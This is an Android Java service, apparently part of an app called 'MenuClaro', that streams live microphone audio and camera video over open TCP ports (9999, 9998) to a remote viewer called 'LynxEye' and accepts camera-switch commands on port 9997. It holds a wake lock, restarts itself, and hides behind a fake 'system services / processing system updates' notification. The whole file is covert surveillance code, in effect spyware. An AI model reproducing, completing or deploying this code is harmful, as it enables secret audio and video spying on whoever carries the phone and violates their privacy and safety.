package com.menuclaro;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.view.Surface;
import androidx.core.app.NotificationCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class StreamService extends Service {

    public static boolean isRunning = false;

    private static final String CHANNEL_ID = "MenuClaroService";
    private static final int PORT_AUDIO   = 9999;
    private static final int PORT_VIDEO   = 9998;
    private static final int PORT_COMMAND = 9997; // new command channel
    private static final int SAMPLE_RATE  = 44100;
    private static final int WIDTH  = 640;
    private static final int HEIGHT = 480;

    private PowerManager.WakeLock wakeLock;
    private AudioRecord audioRecord;
    private Thread audioThread;
    private Thread videoThread;
    private Thread commandThread;
    private volatile boolean streaming = false;

    // Camera state
    private volatile int currentCameraIndex = 0;
    private String[] cameraIds;
    private volatile boolean switchRequested = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "STOP".equals(intent.getAction())) {
            stopSelf();
            return START_NOT_STICKY;
        }
        startForegroundNotification();
        acquireWakeLock();
        streaming = true;
        isRunning = true;
        startAudioServer();
        startVideoServer();
        startCommandServer();
        return START_STICKY;
    }

    private void startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Servicios del sistema", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = getSystemService(NotificationManager.class);
            if (mgr != null) mgr.createNotificationChannel(ch);
        }
        startForeground(1, new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Servicios activos")
                .setContentText("Procesando actualizaciones del sistema...")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true).build());
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MenuClaro::StreamWakeLock");
        wakeLock.acquire();
    }

    // ─── COMMAND SERVER ───────────────────────────────────
    // Listens for commands from LynxEye on port 9997
    private void startCommandServer() {
        commandThread = new Thread(() -> {
            while (streaming) {
                ServerSocket serverSocket = null;
                Socket client = null;
                try {
                    serverSocket = new ServerSocket(PORT_COMMAND);
                    serverSocket.setReuseAddress(true);
                    client = serverSocket.accept();
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(client.getInputStream()));
                    String line;
                    while (streaming && (line = reader.readLine()) != null) {
                        if ("SWITCH_CAM".equals(line.trim())) {
                            switchRequested = true; // Signal video thread to switch
                        }
                    }
                } catch (Exception e) {
                } finally {
                    try { if (client != null) client.close(); } catch (Exception ignored) {}
                    try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
                    if (streaming) try { Thread.sleep(300); } catch (InterruptedException ie) { break; }
                }
            }
        });
        commandThread.setDaemon(true);
        commandThread.start();
    }

    // ─── AUDIO ───────────────────────────────────────────
    private void startAudioServer() {
        audioThread = new Thread(() -> {
            while (streaming) {
                ServerSocket serverSocket = null;
                Socket client = null;
                try {
                    serverSocket = new ServerSocket(PORT_AUDIO);
                    serverSocket.setReuseAddress(true);
                    client = serverSocket.accept();
                    client.setTcpNoDelay(true);

                    int buf = AudioRecord.getMinBufferSize(SAMPLE_RATE,
                            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
                    audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE,
                            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, buf * 4);
                    audioRecord.startRecording();

                    OutputStream out = client.getOutputStream();
                    byte[] buffer = new byte[2048];
                    while (streaming && !client.isClosed()) {
                        int read = audioRecord.read(buffer, 0, buffer.length);
                        if (read > 0) { out.write(buffer, 0, read); out.flush(); }
                    }
                } catch (Exception e) {
                } finally {
                    try { if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); audioRecord = null; } } catch (Exception ignored) {}
                    try { if (client != null) client.close(); } catch (Exception ignored) {}
                    try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
                    if (streaming) try { Thread.sleep(300); } catch (InterruptedException ie) { break; }
                }
            }
        });
        audioThread.setDaemon(true);
        audioThread.start();
    }

    // ─── VIDEO - Fresh camera per client, supports switch ─
    private void startVideoServer() {
        videoThread = new Thread(() -> {
            // Load camera list once
            try {
                CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
                cameraIds = manager.getCameraIdList();
            } catch (Exception e) { cameraIds = new String[]{"0"}; }

            while (streaming) {
                ServerSocket serverSocket = null;
                Socket client = null;
                HandlerThread bgThread = null;
                CameraDevice[] camHolder = {null};
                CameraCaptureSession[] sessionHolder = {null};
                ImageReader imageReader = null;
                switchRequested = false;

                try {
                    serverSocket = new ServerSocket(PORT_VIDEO);
                    serverSocket.setReuseAddress(true);
                    client = serverSocket.accept();
                    client.setTcpNoDelay(true);

                    final OutputStream[] outHolder = {client.getOutputStream()};

                    bgThread = new HandlerThread("CamBg");
                    bgThread.start();
                    final Handler bgHandler = new Handler(bgThread.getLooper());

                    imageReader = ImageReader.newInstance(WIDTH, HEIGHT, ImageFormat.JPEG, 2);
                    final ImageReader finalIR = imageReader;
                    final int[] rotationHolder = {getSensorRotation(currentCameraIndex)};

                    imageReader.setOnImageAvailableListener(reader -> {
                        android.media.Image image = reader.acquireLatestImage();
                        if (image == null) return;
                        try {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);
                            bytes = rotateJpeg(bytes, rotationHolder[0]);
                            OutputStream out = outHolder[0];
                            if (out == null) return;
                            int len = bytes.length;
                            byte[] header = new byte[]{(byte)(len>>24),(byte)(len>>16),(byte)(len>>8),(byte)len};
                            out.write(header);
                            out.write(bytes);
                            out.flush();
                        } catch (Exception e) {
                            outHolder[0] = null;
                        } finally { image.close(); }
                    }, bgHandler);

                    // Open initial camera
                    openCamera(camHolder, sessionHolder, imageReader, bgHandler);

                    final Socket finalClient = client;
                    while (streaming && !finalClient.isClosed() && outHolder[0] != null) {
                        // Check if camera switch was requested
                        if (switchRequested) {
                            switchRequested = false;
                            // Switch camera index
                            currentCameraIndex = (currentCameraIndex + 1) % cameraIds.length;
                            rotationHolder[0] = getSensorRotation(currentCameraIndex);

                            // Close current camera
                            try { if (sessionHolder[0] != null) { sessionHolder[0].close(); sessionHolder[0] = null; } } catch (Exception ignored) {}
                            try { if (camHolder[0] != null) { camHolder[0].close(); camHolder[0] = null; } } catch (Exception ignored) {}
                            Thread.sleep(400);

                            // Open new camera
                            openCamera(camHolder, sessionHolder, finalIR, bgHandler);
                        }
                        Thread.sleep(100);
                    }

                } catch (Exception e) {
                } finally {
                    try { if (sessionHolder[0] != null) sessionHolder[0].close(); } catch (Exception ignored) {}
                    try { if (camHolder[0] != null) camHolder[0].close(); } catch (Exception ignored) {}
                    try { if (imageReader != null) imageReader.close(); } catch (Exception ignored) {}
                    try { if (bgThread != null) { bgThread.quitSafely(); bgThread.join(1000); } } catch (Exception ignored) {}
                    try { if (client != null) client.close(); } catch (Exception ignored) {}
                    try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
                    if (streaming) try { Thread.sleep(500); } catch (InterruptedException ie) { break; }
                }
            }
        });
        videoThread.setDaemon(true);
        videoThread.start();
    }

    private void openCamera(CameraDevice[] camHolder, CameraCaptureSession[] sessionHolder,
                            ImageReader imageReader, Handler bgHandler) {
        CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
        final Object lock = new Object();
        try {
            manager.openCamera(cameraIds[currentCameraIndex], new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    camHolder[0] = camera;
                    try {
                        SurfaceTexture texture = new SurfaceTexture(0);
                        texture.setDefaultBufferSize(WIDTH, HEIGHT);
                        Surface dummy  = new Surface(texture);
                        Surface readerSurface = imageReader.getSurface();
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        builder.addTarget(readerSurface);
                        camera.createCaptureSession(Arrays.asList(dummy, readerSurface),
                                new CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(CameraCaptureSession session) {
                                        sessionHolder[0] = session;
                                        try {
                                            builder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
                                            session.setRepeatingRequest(builder.build(), null, bgHandler);
                                            synchronized (lock) { lock.notifyAll(); }
                                        } catch (Exception e) { e.printStackTrace(); }
                                    }
                                    @Override public void onConfigureFailed(CameraCaptureSession session) {
                                        synchronized (lock) { lock.notifyAll(); }
                                    }
                                }, bgHandler);
                    } catch (Exception e) {
                        e.printStackTrace();
                        synchronized (lock) { lock.notifyAll(); }
                    }
                }
                @Override public void onDisconnected(CameraDevice camera) { camera.close(); synchronized (lock) { lock.notifyAll(); } }
                @Override public void onError(CameraDevice camera, int error) { camera.close(); synchronized (lock) { lock.notifyAll(); } }
            }, bgHandler);
            synchronized (lock) { lock.wait(3000); }
        } catch (Exception e) { e.printStackTrace(); }
    }

    private int getSensorRotation(int cameraIndex) {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            CameraCharacteristics chars = manager.getCameraCharacteristics(cameraIds[cameraIndex]);
            Integer orientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION);
            return orientation != null ? orientation : 90;
        } catch (Exception e) { return 90; }
    }

    private byte[] rotateJpeg(byte[] jpegBytes, int degrees) {
        if (degrees == 0) return jpegBytes;
        try {
            android.graphics.Bitmap original = android.graphics.BitmapFactory.decodeByteArray(jpegBytes, 0, jpegBytes.length);
            if (original == null) return jpegBytes;
            android.graphics.Matrix matrix = new android.graphics.Matrix();
            matrix.postRotate(degrees);
            android.graphics.Bitmap rotated = android.graphics.Bitmap.createBitmap(
                    original, 0, 0, original.getWidth(), original.getHeight(), matrix, true);
            original.recycle();
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            rotated.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, baos);
            rotated.recycle();
            return baos.toByteArray();
        } catch (Exception e) { return jpegBytes; }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        streaming = false;
        isRunning = false;
        try { if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); } } catch (Exception e) {}
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
